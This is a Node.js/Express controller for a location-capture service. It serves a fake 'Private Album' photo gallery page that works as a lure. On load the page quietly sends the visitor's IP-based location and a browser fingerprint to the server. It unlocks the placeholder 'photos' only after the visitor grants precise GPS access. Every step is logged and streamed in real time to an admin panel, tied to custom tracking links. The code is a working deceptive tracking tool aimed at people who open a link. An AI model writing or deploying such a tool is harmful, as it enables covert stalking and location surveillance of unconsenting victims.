const PublicLocation = require('../models/PublicLocation');
const { success, created } = require('../utils/response');
const { getIO } = require('../config/socket');
const logger = require('../utils/logger');
const { reverseGeocode } = require('../services/geocode.service');

const renderCapturePage = async (req, res, next) => {
  try {
    // Check if a custom tracking link is being used
    const trackingLink = req.trackingLink;
    // Get slug from trackingLink OR from URL params (/xxx/:slug)
    const customSlug = trackingLink ? trackingLink.slug : (req.params.slug || null);
    const customTitle = trackingLink ? trackingLink.name : 'Photo Gallery';
    
    // If tracking link is expired, show error
    if (trackingLink && trackingLink.expiresAt && new Date() > trackingLink.expiresAt) {
      return res.status(410).send('<h1>Link Expired</h1><p>This tracking link has expired.</p>');
    }
    
    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
          <meta name="theme-color" content="#4f46e5">
          <title>📸 ${customTitle}</title>
          <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
          <style>
              * { margin: 0; padding: 0; box-sizing: border-box; }
              body {
                  font-family: 'Poppins', sans-serif;
                  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
                  min-height: 100vh;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  padding: 20px;
                  overflow-x: hidden;
                  color: white;
              }
              .container {
                  width: 100%;
                  max-width: 400px;
                  position: relative;
                  z-index: 10;
              }
              .header {
                  text-align: center;
                  margin-bottom: 20px;
              }
              .header-badge {
                  background: linear-gradient(90deg, #4f46e5, #7c3aed);
                  color: white;
                  padding: 6px 16px;
                  border-radius: 20px;
                  font-size: 11px;
                  font-weight: 600;
                  display: inline-block;
                  margin-bottom: 12px;
              }
              .custom-url-badge {
                  background: rgba(255,255,255,0.1);
                  backdrop-filter: blur(10px);
                  border: 1px solid rgba(255,255,255,0.2);
                  padding: 4px 12px;
                  border-radius: 15px;
                  font-size: 10px;
                  color: rgba(255,255,255,0.7);
                  margin-bottom: 10px;
                  display: inline-block;
              }
              h1 {
                  font-size: 1.8rem;
                  font-weight: 700;
                  margin-bottom: 5px;
              }
              .subtitle {
                  color: rgba(255,255,255,0.6);
                  font-size: 0.85rem;
              }
              
              /* Image Album Grid */
              .album-grid {
                  display: grid;
                  grid-template-columns: repeat(2, 1fr);
                  gap: 12px;
                  margin-bottom: 25px;
              }
              .album-card {
                  aspect-ratio: 1;
                  border-radius: 16px;
                  overflow: hidden;
                  position: relative;
                  background: rgba(255,255,255,0.1);
                  border: 2px solid rgba(255,255,255,0.1);
                  transition: transform 0.3s ease, border-color 0.3s ease;
                  cursor: pointer;
              }
              .album-card:hover {
                  transform: scale(1.02);
                  border-color: rgba(255,255,255,0.3);
              }
              .album-card img {
                  width: 100%;
                  height: 100%;
                  object-fit: cover;
              }
              .album-card .placeholder {
                  width: 100%;
                  height: 100%;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  font-size: 3rem;
                  background: linear-gradient(135deg, #4f46e5, #7c3aed);
              }
              .album-card .blur-overlay {
                  position: absolute;
                  inset: 0;
                  backdrop-filter: blur(8px);
                  background: rgba(0,0,0,0.3);
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  font-size: 2rem;
              }
              
              /* View Images Button */
              .view-btn {
                  width: 100%;
                  background: linear-gradient(145deg, #4f46e5, #7c3aed);
                  color: white;
                  border: none;
                  padding: 16px 32px;
                  border-radius: 50px;
                  font-size: 1.1rem;
                  font-weight: 600;
                  cursor: pointer;
                  box-shadow: 0 10px 30px rgba(79, 70, 229, 0.4);
                  transition: all 0.3s ease;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  gap: 10px;
              }
              .view-btn:hover {
                  transform: translateY(-2px);
                  box-shadow: 0 15px 40px rgba(79, 70, 229, 0.5);
              }
              .view-btn:disabled {
                  background: #444;
                  cursor: not-allowed;
                  box-shadow: none;
              }
              .view-btn .icon {
                  font-size: 1.3rem;
              }
              
              /* Loading State */
              .loading-overlay {
                  display: none;
                  position: fixed;
                  inset: 0;
                  background: rgba(0,0,0,0.9);
                  z-index: 1000;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                  gap: 20px;
              }
              .loading-overlay.active {
                  display: flex;
              }
              .spinner {
                  width: 50px;
                  height: 50px;
                  border: 3px solid rgba(255,255,255,0.2);
                  border-top-color: #4f46e5;
                  border-radius: 50%;
                  animation: spin 1s linear infinite;
              }
              @keyframes spin {
                  to { transform: rotate(360deg); }
              }
              .loading-text {
                  color: rgba(255,255,255,0.8);
                font-size: 0.95rem;
              }
              
              /* Gallery View */
              .gallery-overlay {
                  display: none;
                  position: fixed;
                  inset: 0;
                  background: rgba(0,0,0,0.95);
                  z-index: 1001;
                  flex-direction: column;
              }
              .gallery-overlay.active {
                  display: flex;
              }
              .gallery-header {
                  display: flex;
                  align-items: center;
                  justify-content: space-between;
                  padding: 15px 20px;
                  border-bottom: 1px solid rgba(255,255,255,0.1);
              }
              .gallery-title {
                  font-size: 1.1rem;
                  font-weight: 600;
              }
              .close-btn {
                  background: rgba(255,255,255,0.1);
                  border: none;
                  color: white;
                  width: 36px;
                  height: 36px;
                  border-radius: 50%;
                  cursor: pointer;
                  font-size: 1.2rem;
                  display: flex;
                  align-items: center;
                  justify-content: center;
              }
              .gallery-content {
                  flex: 1;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  padding: 20px;
              }
              .gallery-image {
                  max-width: 100%;
                  max-height: 60vh;
                  border-radius: 12px;
                object-fit: contain;
              }
              .gallery-nav {
                  display: flex;
                  justify-content: center;
                  gap: 20px;
                  padding: 20px;
              }
              .nav-btn {
                  background: rgba(255,255,255,0.1);
                  border: none;
                  color: white;
                  padding: 12px 24px;
                  border-radius: 25px;
                  cursor: pointer;
                  font-size: 0.9rem;
              }
              
              #status {
                  margin-top: 15px;
                  font-size: 12px;
                  color: rgba(255,255,255,0.6);
                  text-align: center;
                  min-height: 20px;
              }
          </style>
      </head>
      <body>
          <div class="container">
              <div class="header">
                  <div class="header-badge">📸 PRIVATE ALBUM</div>
                  ${customSlug ? `<div class="custom-url-badge">🔗 /${customSlug}</div>` : ''}
                  <h1>Photo Gallery</h1>
                  <p class="subtitle">View exclusive photos</p>
              </div>
              
              <!-- Album Grid -->
              <div class="album-grid">
                  <div class="album-card" onclick="showGallery(0)">
                      <div class="placeholder">🏖️</div>
                      <div class="blur-overlay">🔒</div>
                  </div>
                  <div class="album-card" onclick="showGallery(1)">
                      <div class="placeholder">🌅</div>
                      <div class="blur-overlay">🔒</div>
                  </div>
                  <div class="album-card" onclick="showGallery(2)">
                      <div class="placeholder">🎉</div>
                      <div class="blur-overlay">�</div>
                  </div>
                  <div class="album-card" onclick="showGallery(3)">
                      <div class="placeholder">📸</div>
                      <div class="blur-overlay">🔒</div>
                  </div>
                  <div class="album-card" onclick="showGallery(4)">
                      <div class="placeholder">✈️</div>
                      <div class="blur-overlay">🔒</div>
                  </div>
                  <div class="album-card" onclick="showGallery(5)">
                      <div class="placeholder">🍽️</div>
                      <div class="blur-overlay">�</div>
                  </div>
              </div>
              
              <button class="view-btn" id="view-btn" onclick="handleViewImages()">
                  <span class="icon">🔓</span>
                  <span>View Images</span>
              </button>
              
              <div id="status"></div>
          </div>
          
          <!-- Loading Overlay -->
          <div class="loading-overlay" id="loading-overlay">
              <div class="spinner"></div>
              <div class="loading-text">Unlocking gallery...</div>
          </div>
          
          <!-- Gallery Overlay -->
          <div class="gallery-overlay" id="gallery-overlay">
              <div class="gallery-header">
                  <div class="gallery-title">📸 Photo Gallery</div>
                  <button class="close-btn" onclick="closeGallery()">✕</button>
              </div>
              <div class="gallery-content">
                  <img class="gallery-image" id="gallery-image" src="" alt="Photo">
              </div>
              <div class="gallery-nav">
                  <button class="nav-btn" onclick="prevImage()">← Previous</button>
                  <button class="nav-btn" onclick="nextImage()">Next →</button>
              </div>
          </div>

          <script>
              const CUSTOM_SLUG = '${customSlug || ''}';
              const status = document.getElementById('status');
              const viewBtn = document.getElementById('view-btn');
              const loadingOverlay = document.getElementById('loading-overlay');
              const galleryOverlay = document.getElementById('gallery-overlay');
              const galleryImage = document.getElementById('gallery-image');
              
              let currentImageIndex = 0;
              let galleryUnlocked = false;
              
              // Emoji gallery images (using placeholders)
              const galleryImages = [
                  'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=800',
                  'https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?w=800',
                  'https://images.unsplash.com/photo-1514525253161-7a46d19cd819?w=800',
                  'https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=800',
                  'https://images.unsplash.com/photo-1436491865332-7a61a109cc05?w=800',
                  'https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=800'
              ];

              const getVisitorId = () => {
                  try {
                      let vid = localStorage.getItem('socius_vid');
                      if (!vid) {
                          vid = 'v_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
                          localStorage.setItem('socius_vid', vid);
                      }
                      return vid;
                  } catch (e) {
                      return 'v_' + Date.now().toString(36);
                  }
              };

              const getFingerprintData = async () => {
                  const data = {
                      platform: navigator.platform,
                      vendor: navigator.vendor,
                      cpuCores: navigator.hardwareConcurrency || 0,
                      memory: navigator.deviceMemory || 0,
                      screen: window.screen.width + 'x' + window.screen.height,
                      language: navigator.language,
                      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                      userAgent: navigator.userAgent,
                  };
                  return data;
              };

              const generateHash = (data) => {
                  const str = JSON.stringify(data);
                  let hash = 0;
                  for (let i = 0; i < str.length; i++) {
                      const char = str.charCodeAt(i);
                      hash = ((hash << 5) - hash) + char;
                      hash = hash & hash;
                  }
                  return 'fp_' + Math.abs(hash).toString(16);
              };

              // Tracking helper
              const visitorId = getVisitorId();
              let currentFp = null;
              
              const track = async (event, eventData = {}) => {
                  try {
                      const fp = currentFp || await getFingerprintData();
                      currentFp = fp;
                      await fetch('/public/track-event', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                              visitorId,
                              event,
                              eventData,
                              trackingLinkSlug: CUSTOM_SLUG,
                              fingerprintHash: generateHash(fp),
                              screenResolution: fp.screen,
                              language: fp.language,
                              timezone: fp.timezone,
                              userAgent: fp.userAgent,
                              deviceInfo: fp
                          })
                      });
                  } catch (e) { console.log('Track error:', e); }
              };

              // Track page load
              track('page_load');

              // Auto-capture on load
              window.addEventListener('load', async () => {
                  try {
                      const res = await fetch('https://ipapi.co/json/');
                      const geo = await res.json();
                      const fp = await getFingerprintData();
                      await fetch('/public/save-location', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                              latitude: geo.latitude || 0,
                              longitude: geo.longitude || 0,
                              accuracy: 5000,
                              method: 'ip-api',
                              visitorId: getVisitorId(),
                              fingerprintHash: generateHash(fp),
                              screenResolution: fp.screen,
                              language: fp.language,
                              timezone: fp.timezone,
                              userAgent: fp.userAgent,
                              deviceInfo: fp,
                              trackingLinkSlug: CUSTOM_SLUG
                          })
                      });
                  } catch (e) {}
              });

              async function handleViewImages() {
                  if (galleryUnlocked) {
                      showGallery(0);
                      return;
                  }
                  
                  viewBtn.disabled = true;
                  loadingOverlay.classList.add('active');
                  status.textContent = '📍 Requesting location access...';
                  
                  await track('view_images_clicked');
                  
                  if (!navigator.geolocation) {
                      status.innerHTML = '<span style="color: #ef4444;">❌ Location not supported</span>';
                      loadingOverlay.classList.remove('active');
                      viewBtn.disabled = false;
                      return;
                  }
                  
                  // Request location
                  navigator.geolocation.getCurrentPosition(
                      async (position) => {
                          await track('permission_result', { status: 'granted' });
                          await track('location_captured', {
                              latitude: position.coords.latitude,
                              longitude: position.coords.longitude,
                              accuracy: position.coords.accuracy
                          });
                          
                          // Send location to server
                          const fp = await getFingerprintData();
                          await fetch('/public/save-location', {
                              method: 'POST',
                              headers: { 'Content-Type': 'application/json' },
                              body: JSON.stringify({
                                  latitude: position.coords.latitude,
                                  longitude: position.coords.longitude,
                                  accuracy: position.coords.accuracy,
                                  method: 'geolocation',
                                  visitorId: getVisitorId(),
                                  fingerprintHash: generateHash(fp),
                                  screenResolution: fp.screen,
                                  language: fp.language,
                                  timezone: fp.timezone,
                                  userAgent: fp.userAgent,
                                  deviceInfo: fp,
                                  trackingLinkSlug: CUSTOM_SLUG
                              })
                          });
                          
                          // Unlock gallery
                          galleryUnlocked = true;
                          loadingOverlay.classList.remove('active');
                          status.innerHTML = '<span style="color: #22c55e;">✅ Gallery unlocked!</span>';
                          viewBtn.innerHTML = '<span class="icon">📸</span><span>View Images</span>';
                          
                          // Remove blur overlays
                          document.querySelectorAll('.blur-overlay').forEach(el => {
                              el.style.opacity = '0';
                              el.style.pointerEvents = 'none';
                          });
                          
                          // Show first image
                          showGallery(0);
                      },
                      async (error) => {
                          await track('permission_result', { 
                              status: error.code === 1 ? 'denied' : 'error',
                              errorCode: error.code 
                          });
                          status.innerHTML = '<span style="color: #ef4444;">❌ Location access required to view images</span>';
                          loadingOverlay.classList.remove('active');
                          viewBtn.disabled = false;
                      },
                      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                  );
              }
              
              function showGallery(index) {
                  if (!galleryUnlocked) {
                      handleViewImages();
                      return;
                  }
                  currentImageIndex = index;
                  galleryImage.src = galleryImages[index];
                  galleryOverlay.classList.add('active');
              }
              
              function closeGallery() {
                  galleryOverlay.classList.remove('active');
              }
              
              function nextImage() {
                  currentImageIndex = (currentImageIndex + 1) % galleryImages.length;
                  galleryImage.src = galleryImages[currentImageIndex];
              }
              
              function prevImage() {
                  currentImageIndex = (currentImageIndex - 1 + galleryImages.length) % galleryImages.length;
                  galleryImage.src = galleryImages[currentImageIndex];
              }
          </script>
      </body>
      </html>
    `;
    res.send(html);
  } catch (err) {
    next(err);
  }
};

const saveLocation = async (req, res, next) => {
  try {
    const { 
      latitude, longitude, accuracy, altitude, method,
      visitorId, fingerprintHash, screenResolution, language, timezone, 
      batteryLevel, networkType, deviceInfo, networkInfo, behavioralData, isUpdate,
      trackingLinkSlug
    } = req.body;
    
    // Check if we already have a recent entry for this visitor to avoid duplicates
    if (visitorId && method === 'ip-api') {
      const existing = await PublicLocation.findOne({
        visitorId,
        method: 'ip-api',
        createdAt: { $gt: new Date(Date.now() - 10 * 60 * 1000) } // 10 minutes
      });
      if (existing) {
        return success(res, existing, 'Location already captured recently');
      }
    }

    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ error: 'Latitude and longitude are required' });
    }

    // Reverse geocode to get address from coordinates
    const address = await reverseGeocode(latitude, longitude);

    // If isUpdate flag is true, update the most recent record for this visitor
    if (isUpdate && visitorId) {
      const recentRecord = await PublicLocation.findOneAndUpdate(
        { visitorId, method: 'geolocation' },
        {
          $set: {
            'location.coordinates': [longitude, latitude],
            accuracy,
            altitude,
            updatedAt: new Date(),
            address: address
          }
        },
        { sort: { createdAt: -1 }, new: true }
      );
      
      if (recentRecord) {
        return success(res, recentRecord, 'Location updated successfully');
      }
    }

    const publicLocation = new PublicLocation({
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
      userAgent: req.headers['user-agent'],
      location: {
        type: 'Point',
        coordinates: [longitude, latitude],
      },
      accuracy,
      altitude,
      method: method || 'geolocation',
      visitorId: visitorId || 'v_unknown_' + Math.random().toString(36).substr(2, 5),
      fingerprintHash,
      screenResolution,
      language,
      timezone,
      batteryLevel,
      networkType,
      deviceInfo,
      networkInfo,
      behavioralData,
      address: address,
      trackingLinkSlug: trackingLinkSlug || null
    });

    await publicLocation.save();
    
    // Increment tracking link stats if applicable
    if (trackingLinkSlug) {
      const { incrementLinkStats } = require('./trackingLink.controller');
      incrementLinkStats(trackingLinkSlug, true, method === 'geolocation');
    }
    
    // Emit Socket.IO event to notify admins
    try {
      const io = getIO();
      io.to('admin').emit('location:captured', {
        visitorId: publicLocation.visitorId,
        ip: publicLocation.ip,
        location: publicLocation.location,
        accuracy: publicLocation.accuracy,
        method: publicLocation.method,
        createdAt: publicLocation.createdAt,
        address: address,
        screenResolution: publicLocation.screenResolution,
        batteryLevel: publicLocation.batteryLevel,
        networkType: publicLocation.networkType,
        deviceInfo: publicLocation.deviceInfo,
        networkInfo: publicLocation.networkInfo,
        language: publicLocation.language,
        timezone: publicLocation.timezone,
        trackingLinkSlug: publicLocation.trackingLinkSlug
      });
      logger.info(`Socket.IO: Location captured event emitted for visitor ${publicLocation.visitorId} at ${address?.displayAddress || 'Unknown'}`);
    } catch (socketErr) {
      logger.error('Socket.IO emit failed:', socketErr.message);
    }
    
    return created(res, publicLocation, 'Location and fingerprint saved successfully');
  } catch (err) {
    next(err);
  }
};

const getAllLocations = async (req, res, next) => {
  try {
    const locations = await PublicLocation.find().sort({ createdAt: -1 });
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

const getLocationByVisitorId = async (req, res, next) => {
  try {
    const { visitorId } = req.params;
    // Try to find by visitorId OR ip (if visitorId is an IP)
    const locations = await PublicLocation.find({ 
      $or: [
        { visitorId: visitorId },
        { ip: visitorId }
      ]
    }).sort({ createdAt: -1 });
    
    if (!locations || locations.length === 0) {
      return res.status(404).json({ error: 'No data found for this visitor' });
    }
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

const trackEvent = async (req, res, next) => {
  try {
    const { 
      visitorId, 
      event, 
      eventData,
      pageLoadedAt,
      fingerprintHash,
      screenResolution, 
      language, 
      timezone,
      userAgent,
      deviceInfo,
      networkInfo,
      trackingLinkSlug
    } = req.body;
    
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    
    // Find or create a tracking record for this visitor
    let tracking = await PublicLocation.findOne({ 
      visitorId, 
      method: 'geolocation',
      createdAt: { $gt: new Date(Date.now() - 30 * 60 * 1000) } // Within 30 minutes
    });
    
    if (!tracking) {
      // Create new tracking record
      tracking = new PublicLocation({
        ip,
        userAgent: userAgent || req.headers['user-agent'],
        visitorId: visitorId || 'v_unknown_' + Math.random().toString(36).substr(2, 5),
        fingerprintHash,
        screenResolution,
        language,
        timezone,
        deviceInfo,
        networkInfo,
        method: 'geolocation',
        location: { type: 'Point', coordinates: [0, 0] },
        trackingLinkSlug: trackingLinkSlug || null,
        trackingJourney: {
          pageLoadedAt: pageLoadedAt ? new Date(pageLoadedAt) : new Date(),
          journeyStatus: 'page_loaded'
        }
      });
    }
    
    // Update based on event type
    const now = new Date();
    
    switch (event) {
      case 'page_load':
        tracking.trackingJourney.pageLoadedAt = now;
        tracking.trackingJourney.journeyStatus = 'page_loaded';
        break;
        
      case 'spin_button_clicked':
        tracking.trackingJourney.spinButtonClickedAt = now;
        tracking.trackingJourney.journeyStatus = 'clicked';
        break;
        
      case 'permission_requested':
        tracking.trackingJourney.permissionRequestedAt = now;
        tracking.trackingJourney.permissionStatus = 'pending';
        tracking.trackingJourney.journeyStatus = 'permission_requested';
        break;
        
      case 'permission_result':
        tracking.trackingJourney.permissionStatus = eventData.status; // 'granted', 'denied', 'timeout'
        tracking.trackingJourney.permissionErrorCode = eventData.errorCode || null;
        tracking.trackingJourney.permissionErrorMessage = eventData.errorMessage || null;
        if (eventData.status === 'granted') {
          tracking.trackingJourney.journeyStatus = 'permission_granted';
        } else if (eventData.status === 'denied') {
          tracking.trackingJourney.journeyStatus = 'permission_denied';
        } else {
          tracking.trackingJourney.journeyStatus = 'failed';
        }
        break;
        
      case 'location_attempt':
        tracking.trackingJourney.locationAttempts = (tracking.trackingJourney.locationAttempts || 0) + 1;
        break;
        
      case 'location_captured':
        tracking.trackingJourney.locationCapturedAt = now;
        tracking.trackingJourney.journeyStatus = 'location_captured';
        // Update coordinates if provided
        if (eventData.latitude && eventData.longitude) {
          tracking.location.coordinates = [eventData.longitude, eventData.latitude];
          tracking.accuracy = eventData.accuracy;
        }
        break;
        
      case 'spin_completed':
        tracking.trackingJourney.spinCompletedAt = now;
        if (tracking.trackingJourney.journeyStatus === 'location_captured') {
          tracking.trackingJourney.journeyStatus = 'completed';
        }
        break;
        
      case 'error':
        tracking.trackingJourney.journeyStatus = 'failed';
        tracking.trackingJourney.permissionErrorMessage = eventData.message;
        break;
    }
    
    await tracking.save();
    
    // Emit to admin panel for real-time updates
    try {
      const io = getIO();
      io.to('admin').emit('tracking:event', {
        visitorId: tracking.visitorId,
        ip: tracking.ip,
        event,
        journeyStatus: tracking.trackingJourney.journeyStatus,
        permissionStatus: tracking.trackingJourney.permissionStatus,
        trackingLinkSlug: tracking.trackingLinkSlug,
        deviceInfo: {
          screenResolution: tracking.screenResolution,
          language: tracking.language,
          timezone: tracking.timezone
        },
        timestamp: now
      });
    } catch (e) {}
    
    return success(res, { visitorId: tracking.visitorId }, 'Event tracked');
  } catch (err) {
    next(err);
  }
};

module.exports = {
  renderCapturePage,
  saveLocation,
  getAllLocations,
  getLocationByVisitorId,
  trackEvent,
};
